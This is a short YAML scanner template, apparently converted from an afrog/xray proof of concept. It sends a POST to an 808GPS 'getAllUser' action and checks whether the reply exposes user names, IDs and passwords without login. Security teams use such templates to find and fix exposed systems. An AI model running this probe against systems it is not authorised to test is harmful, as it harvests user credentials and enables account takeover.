# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: json=null
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"password":'
          - '"name":'
          - '"id":'
          - '"result":0'
        condition: and
      - type: word
        part: header
        words:
          - application/json
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/808gps/StandardLoginAction_getAllUser.action'
